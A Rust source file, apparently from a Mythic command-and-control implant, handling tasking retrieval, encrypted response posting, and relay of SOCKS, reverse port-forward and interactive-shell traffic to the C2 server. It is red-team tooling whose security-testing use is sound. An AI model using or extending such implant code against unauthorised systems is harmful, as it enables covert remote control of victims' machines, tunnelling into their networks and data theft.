use std::thread::sleep;
use std::time::Duration;

use mythic::{
    Aes256HmacCrypto, AgentExtras, AgentMessageExtras, AgentResponseExtras, C2Transport,
    MythicAgent, MythicError, MythicResult, ReqPostResponse, RespGetTasking, TaskResponse,
    decode_message, decode_message_plain, encode_message, encode_message_plain,
};
use serde::Deserialize;

use crate::DEBUG;
use crate::auxiliary::AuxiliaryManager;
use crate::dispatch;
use crate::interactive::InteractiveManager;
use crate::rpfwd::RpfwdManager;
use crate::socks::SocksManager;
use crate::streams::StreamDriver;
use core::sync::atomic::Ordering;

const MAX_POST_RESPONSE_DRAIN_CYCLES: usize = 10_000;

#[derive(Debug, Deserialize)]
struct RichPostResponse {
    #[allow(dead_code)]
    action: String,
    #[serde(default)]
    responses: Vec<dispatch::PostResponseReceipt>,
    #[serde(flatten)]
    #[allow(dead_code)]
    extras: AgentResponseExtras,
}

pub struct ProtocolPump {
    pending: Vec<TaskResponse>,
    socks: SocksManager,
    rpfwd: RpfwdManager,
    interactive: InteractiveManager,
    auxiliary: AuxiliaryManager,
}

impl ProtocolPump {
    pub fn new() -> Self {
        Self {
            pending: Vec::new(),
            socks: SocksManager::new(),
            rpfwd: RpfwdManager::new(),
            interactive: InteractiveManager::new(),
            auxiliary: AuxiliaryManager::new(),
        }
    }

    pub fn pending_mut(&mut self) -> &mut Vec<TaskResponse> {
        &mut self.pending
    }

    pub fn start_rpfwd(&mut self, task: &mythic::TaskMessage) -> TaskResponse {
        self.rpfwd.start_from_task(task)
    }

    pub fn start_interactive(&mut self, task: &mythic::TaskMessage) -> TaskResponse {
        self.interactive.start_from_task(task)
    }

    pub fn wants_fast_poll(&self) -> bool {
        StreamDriver::wants_fast_poll(&self.socks)
            || StreamDriver::wants_fast_poll(&self.rpfwd)
            || StreamDriver::wants_fast_poll(&self.interactive)
            || self.auxiliary.wants_fast_poll()
    }

    pub fn has_pending_work(&self) -> bool {
        !self.pending.is_empty() || self.wants_fast_poll()
    }

    pub fn build_shared(&mut self) -> AgentExtras {
        let mut shared = AgentExtras {
            socks: StreamDriver::drain_outbound(&mut self.socks),
            rpfwd: StreamDriver::drain_outbound(&mut self.rpfwd),
            interactive: StreamDriver::drain_outbound(&mut self.interactive),
            ..Default::default()
        };
        self.pending.extend(self.interactive.drain_responses());
        self.auxiliary.drain_into(&mut shared);
        shared
    }

    pub fn handle_inbound(&mut self, extras: AgentResponseExtras) {
        self.auxiliary.handle_inbound(&extras);
        StreamDriver::handle_inbound(&mut self.socks, extras.socks);
        StreamDriver::handle_inbound(&mut self.rpfwd, extras.rpfwd);
        StreamDriver::handle_inbound(&mut self.interactive, extras.interactive);
    }

    pub fn requeue_shared(&mut self, shared: AgentExtras) {
        StreamDriver::requeue_outbound_front(&mut self.socks, shared.socks);
        StreamDriver::requeue_outbound_front(&mut self.rpfwd, shared.rpfwd);
        StreamDriver::requeue_outbound_front(&mut self.interactive, shared.interactive);
        self.auxiliary.requeue_alerts_front(shared.alerts);
    }

    pub fn get_tasking<C: C2Transport>(
        &mut self,
        mythic: &MythicAgent,
        task_size: u32,
        c2: &C,
    ) -> MythicResult<RespGetTasking> {
        let shared = self.build_shared();
        match get_tasking_with(mythic, task_size, c2, Vec::new(), shared.clone()) {
            Ok(tasking) => {
                self.handle_inbound(tasking.extras.clone());
                Ok(tasking)
            }
            Err(e) => {
                self.requeue_shared(shared);
                Err(e)
            }
        }
    }

    pub fn post_once<C: C2Transport>(&mut self, mythic: &MythicAgent, c2: &C) -> MythicResult<()> {
        let shared = self.build_shared();
        if self.pending.is_empty()
            && shared.socks.is_empty()
            && shared.rpfwd.is_empty()
            && shared.interactive.is_empty()
            && shared.alerts.is_empty()
        {
            return Ok(());
        }

        let batch = std::mem::take(&mut self.pending);
        let retry_batch = batch.clone();
        let retry_shared = shared.clone();

        match post_response_rich(mythic, batch, shared, c2) {
            Ok(receipt) => {
                self.handle_inbound(receipt.extras);
                self.pending
                    .extend(dispatch::responses_from_post_response_receipts(
                        &receipt.responses,
                    ));
                Ok(())
            }
            Err(e) => {
                self.pending.extend(retry_batch);
                self.requeue_shared(retry_shared);
                Err(e)
            }
        }
    }

    pub fn post_until_drained<C: C2Transport>(
        &mut self,
        mythic: &MythicAgent,
        c2: &C,
    ) -> MythicResult<()> {
        for _ in 0..MAX_POST_RESPONSE_DRAIN_CYCLES {
            if !self.has_pending_work() {
                return Ok(());
            }
            let before_pending = self.pending.len();
            self.post_once(mythic, c2)?;
            if self.pending.is_empty() && before_pending == 0 {
                return Ok(());
            }
        }
        Err(MythicError::protocol(format!(
            "post_response drain exceeded {MAX_POST_RESPONSE_DRAIN_CYCLES} cycles with {} response(s) still pending",
            self.pending.len()
        )))
    }

    pub fn flush<C: C2Transport>(&mut self, mythic: &MythicAgent, c2: &C) {
        if !self.has_pending_work() {
            return;
        }
        let total = self.pending.len();
        info!("[*] flushing {} response(s) before exit", total);
        for attempt in 1..=3u32 {
            match self.post_until_drained(mythic, c2) {
                Ok(_) => return,
                Err(e) => {
                    if DEBUG.load(Ordering::Relaxed) {
                        eprintln!("[!] flush attempt {attempt}/3 failed: {e}");
                    }
                    if attempt < 3 {
                        sleep(Duration::from_secs(1));
                    }
                }
            }
        }
        if DEBUG.load(Ordering::Relaxed) {
            eprintln!("[!] flush dropped {total} response(s) after 3 attempts");
        }
    }
}

fn get_tasking_with<C: C2Transport>(
    mythic: &MythicAgent,
    task_size: u32,
    c2: &C,
    responses: Vec<TaskResponse>,
    shared: AgentExtras,
) -> MythicResult<RespGetTasking> {
    let extras = AgentMessageExtras { responses, shared };
    mythic.get_tasking_with(task_size, c2, extras)
}

fn post_response_rich<C: C2Transport>(
    mythic: &MythicAgent,
    responses: Vec<TaskResponse>,
    shared: AgentExtras,
    c2: &C,
) -> MythicResult<RichPostResponse> {
    let req = ReqPostResponse::from_extras(AgentMessageExtras { responses, shared });
    if let Some(key_b64) = c2.get_aes_psk() {
        let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
        let iv = c2.random_iv()?;
        let packed = encode_message(&req, mythic.callback_uuid(), &crypto, &iv)?;
        let response = c2.post_response(&packed)?;
        decode_message(&response, Some(mythic.callback_uuid()), &crypto).map(|(_, r)| r)
    } else {
        let packed = encode_message_plain(&req, mythic.callback_uuid())?;
        let response = c2.post_response(&packed)?;
        decode_message_plain(&response, Some(mythic.callback_uuid())).map(|(_, r)| r)
    }
}
